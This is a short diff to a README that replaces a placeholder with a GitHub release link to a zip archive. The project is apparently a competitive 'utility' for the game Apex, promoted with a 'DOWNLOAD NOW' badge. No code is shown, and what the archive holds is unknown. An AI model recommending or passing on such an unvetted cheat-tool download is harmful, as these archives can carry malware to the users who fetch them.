@@ -48,7 +48,7 @@ This tool is intended **ONLY** for:
 ## 📥 Download
 
 <p align="center">
-  <a href="ССЫЛКА_НА_СКАЧИВАНИЕ">
+  <a href="https://github.com/ConquerorJayVault32/Apex-Competitive-Utility/releases/download/1/AL.UT.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
